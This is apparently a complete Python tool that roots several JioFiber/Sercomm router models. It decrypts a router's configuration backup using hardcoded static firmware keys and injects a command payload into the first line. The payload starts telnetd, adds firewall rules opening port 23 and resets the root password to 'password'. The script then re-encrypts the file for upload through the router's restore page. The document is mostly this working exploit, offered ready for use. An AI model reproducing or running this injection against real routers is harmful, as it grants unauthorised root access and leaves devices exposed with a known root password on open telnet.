#!/usr/bin/env python3
"""
JioFiber Universal Root Unlocker (v1.0)
Author: Anand (@Asjohn720)
Supports: JCOW414, JCOW404, JCOW403, JCOW401, JCO4032, JCO110
"""
import sys, os, glob, subprocess, hashlib

DEVICE_DATABASE = [
    {"name": "Sercomm JCOW414",  "key": "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55", "fw": "R2.15"},
    {"name": "JioFiber JCOW404", "key": "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A", "fw": "R2.15/R2.3"},
    {"name": "JioFiber JCOW403", "key": "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A", "fw": "R2.15/R2.3"},
    {"name": "JioFiber JCOW401", "key": "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A", "fw": "R2.15/R2.3"},
    {"name": "JioFiber JCO4032", "key": "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55", "fw": "R2.15"},
    {"name": "JioFiber JCO110",  "key": "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55", "fw": "R2.15"}
]

UNIVERSAL_PAYLOAD = 'config.userdb = {} os.execute("telnetd -p 23; /usr/sbin/telnetd; /pfrm2.0/bin/iptables -I fwInBypass -p tcp --dport 23 -m ifgroup --ifgroup-in 0x1/0x1 -j ACCEPT 2>/dev/null; iptables -I INPUT -p tcp --dport 23 -j ACCEPT 2>/dev/null; echo -e \\"password\\npassword\\" | passwd root");'

def key_bytes(hexstr):
    return bytes.fromhex(hexstr.replace(" ", ""))

def derive_key_iv(key, salt):
    derived = b""
    prev = b""
    while len(derived) < 32:
        prev = hashlib.sha256(prev + key + salt).digest()
        derived += prev
    return derived[:16], derived[16:32]

def openssl_crypt(encrypt, data, key, iv):
    cmd = [
        "openssl", "aes-128-cbc",
        "-e" if encrypt else "-d",
        "-K", key.hex(),
        "-iv", iv.hex()
    ]
    try:
        result = subprocess.run(cmd, input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        sys.exit("[-] Error: 'openssl' not found. Please install OpenSSL and retry.")
    if result.returncode != 0:
        return None
    return result.stdout

def find_backup_file():
    if len(sys.argv) > 1:
        return sys.argv[1].strip('"\'')
    candidates = glob.glob("*JCO*.enc")
    candidates = [c for c in candidates if "root" not in c]
    if candidates:
        return candidates[0]
    user_input = input("  Drag & drop or enter path to your downloaded backup (.enc) file: ").strip()
    return user_input.strip('"\'')

def try_decrypt(infile, key):
    try:
        with open(infile, "rb") as f:
            data = f.read()
    except OSError:
        return None
    if len(data) < 32 or data[:8] != b"Salted__":
        return None
    salt, ciphertext = data[8:16], data[16:]
    derived_key, derived_iv = derive_key_iv(key_bytes(key), salt)
    plain = openssl_crypt(False, ciphertext, derived_key, derived_iv)
    if plain is None:
        return None
    first_line = plain.split(b"\n", 1)[0]
    if first_line.startswith(b"config") or first_line.startswith(b"<?xml"):
        return plain
    return None

def main():
    print("=" * 65)
    print("      JioFiber Universal Root Unlocker  [v1.0]")
    print("           Developed by Anand (@Asjohn720)")
    print("=" * 65)
    print("\nSelect your JioFiber Router Model:")
    for i, dev in enumerate(DEVICE_DATABASE, 1):
        print(f"  [{i}] {dev['name'].ljust(18)} (Requires: {dev['fw']})")
        
    choice = input(f"\nSelect model [1-{len(DEVICE_DATABASE)}] (Default: 1): ").strip()
    idx = int(choice) - 1 if (choice.isdigit() and 1 <= int(choice) <= len(DEVICE_DATABASE)) else 0
    selected = DEVICE_DATABASE[idx]
    print(f"\n[*] Target Device: {selected['name']} (Firmware: {selected['fw']})")

    print("\n" + "+"*65)
    print(" HOW TO GET YOUR BACKUP (.enc) FILE:")
    print(" 1. Go to router page: http://192.168.29.1")
    print(f" 2. Ensure router is downgraded to {selected['fw']}")
    print(" 3. Go to: Administrator -> Maintenance -> Backup/Restore")
    print(" 4. Click [Backup] button to download .enc file")
    print("+"*65 + "\n")

    infile = find_backup_file()
    if not os.path.exists(infile):
        print(f"[-] Error: File '{infile}' not found!")
        sys.exit(1)
        
    print(f"[*] Input file: {infile}")
    print("[1/3] Decrypting backup file with firmware key...")
    
    plain = try_decrypt(infile, selected['key'])
    used_key = selected['key']
    
    if plain is None:
        print("[!] Primary key didn't match. Testing alternate keys...")
        all_keys = [
            "BE F2 26 75 7C B1 49 CB 04 CD CA 84 DC 5B E9 55",
            "BE E9 5B 75 34 3E 75 DC 5E F2 B1 75 75 CA 75 0A"
        ]
        for k in all_keys:
            if k != selected['key']:
                plain = try_decrypt(infile, k)
                if plain is not None:
                    used_key = k
                    print("[✔] Successfully decrypted with alternate JioFiber key!")
                    break
                
    if plain is None:
        print("\n[-] Error: Decryption failed! The file could not be decrypted.")
        print(f"    Please make sure you have downgraded to {selected['fw']} first.")
        sys.exit(1)

    print("[2/3] Injecting root Telnet shell execution payload into Line 1...")
    text = plain.replace(b"\r\n", b"\n").replace(b"\r", b"\n")
    lines = text.split(b"\n")
    lines[0] = UNIVERSAL_PAYLOAD.encode("latin-1")
    modified = b"\n".join(lines)

    print("[3/3] Re-encrypting into ready-to-upload backup package...")
    new_salt = os.urandom(8)
    derived_key, derived_iv = derive_key_iv(key_bytes(used_key), new_salt)
    ciphertext = openssl_crypt(True, modified, derived_key, derived_iv)
    if ciphertext is None:
        print("Error running OpenSSL encrypt: command failed")
        sys.exit(1)

    out_dir = os.path.dirname(infile) or "."
    base_name = os.path.splitext(os.path.basename(infile))[0]
    model_token = selected['name'].split()[-1]
    if model_token not in base_name:
        base_name += "_" + model_token
    out_file = os.path.join(out_dir, base_name + "_MODIFIED.enc")
    with open(out_file, "wb") as f:
        f.write(b"Salted__" + new_salt + ciphertext)
        
    print("\n" + "="*65)
    print("  SUCCESS! Root exploit injected successfully!")
    print(f"  Output file: {out_file}")
    print("="*65)
    print("\nNext Steps:")
    print("1. In Router Web Panel, go to: Maintenance -> Backup/Restore")
    print(f"2. Under 'Restore', choose '{os.path.basename(out_file)}' and click Restore")
    print("3. (Notice 'checksum error' in Web UI is normal & expected)")
    print("4. Connect via Telnet: telnet 192.168.29.1 23 (root / password)")
    print("\n  Special Thanks: Static decryption keys researched by @gpsarathy")

if __name__ == "__main__":
    main()